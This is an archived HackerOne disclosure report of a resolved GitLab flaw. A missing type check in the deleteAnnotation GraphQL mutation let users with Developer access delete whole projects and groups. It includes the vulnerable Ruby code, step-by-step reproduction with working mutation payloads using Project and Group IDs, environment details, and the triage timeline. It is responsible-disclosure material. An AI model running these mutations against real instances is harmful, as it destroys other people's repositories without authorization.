---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/type-confusion
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Type Confusion"
enriched: true
body: true
date: 2020-11-02
submitted: 2020-08-17T07:28:36.178Z
bounty_usd: 5000
votes: 16
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ledz1996"
source: "https://hackerone.com/reports/960244"
title: "Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ..."
---
# Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 16 | **Program:** GitLab | **Disclosed:** 2020-11-02

- Report: [https://hackerone.com/reports/960244](https://hackerone.com/reports/960244)
- CWE: Type Confusion
- Submitted: 2020-08-17T07:28:36.178Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

Similar bug to #858671, but this time with annotations mutation: `DeleteAnnotation`

in ***app/graphql/mutations/metrics/dashboard/annotations/base.rb***

```ruby
module Mutations
  module Metrics
    module Dashboard
      module Annotations
        class Base < BaseMutation
          private

          # This method is defined here in order to be used by `authorized_find!` in the subclasses.
          def find_object(id:)
            GitlabSchema.object_from_id(id)
          end
        end
      end
    end
  end
end

```

There is no type check for `find_object` in ***app/graphql/mutations/metrics/dashboard/annotations/delete.rb***
```ruby
    annotation = authorized_find!(id: id)

            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute
```

And luckily, Developer is sufficient for the permission check 

***app/services/metrics/dashboard/annotations/delete_service.rb***
```ruby
Ability.allowed?(user, :delete_metrics_dashboard_annotation, annotation)
```

### Steps to reproduce

1. For User A, Create project A Private adding User B as Developer
2. For User B, execute the following mutation in `http://gitlab.example.vm/-/graphql-explorer`

```graphql
mutation {
  deleteAnnotation(input: {id: "gid://Gitlab/Project/<project-id>"}) {
    clientMutationId
  }
}
```
3. Project disappear along with Repository

███████

#### Results of GitLab environment info

```
System information
System:     
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.6p146
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.9
Git Version:    2.27.0
Sidekiq Version:5.2.9
Go Version: unknown

GitLab information
Version:    13.2.3-ee
Revision:   640e2695514
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 11.7
URL:        http://gitlab.example.vm
HTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers: 

GitLab Shell
Version:    13.3.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

Unauthorized deleting of repository/project by maintainers, developers

## Timeline

- **Report Filed**
- **2020-08-17** @ledz1996: Also I believe this is not scoped only to Project but also Group, Issue, etc..

```ruby
irb(main):012:0> Ability.allowed?(User.find(2), :delete_metrics_dashboard_annotation, Group.find(7))
=> true
```
- **Report Title Updated**
- **Report Title Updated**
- **2020-08-17** @gitlab-securitybot: Hi @ledz1996,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-08-18** @ledz1996: To use it on group simple replace Project with Group in the graphql, Make sure you have developer permission.
```graphql
mutation {
  deleteAnnotation(input: {id: "gid://Gitlab/Group/<group-id>"}) {
    clientMutationId
  }
}
```
- **2020-08-19** @ledz1996: Hi folks, is there any difficulties in verifying this issue?
- **2020-08-19** @dcouture: Hi @ledz1996,

Thank you for your report, we'll be validating it shortly. Following #858671 a few issues were opened and there are already some fixes that are ready but not deployed yet, we have to cross check if this issue hasn't already been discovered. You'll receive updates soon.

Thank you for your patience,
Dominic
GitLab Security Team
- **2020-08-21** @ledz1996: Hi @dcouture, thank you for the response, please let me know if you need any technical information on the issue ;). Thank for your work.
- **Report Severity Updated**
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2020-08-29** @gitlab-securitybot: ETA for fix:

Hi @ledz1996,

The issue you reported is currently scheduled to be fixed by 2020-10-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-11-02** @ledz1996: oh wait, could you please remove the video?
- **2020-11-02** @dcouture: Sure thing, it's removed now and also in the GitLab issue.

Best regards,
Dominic
GitLab Security Team
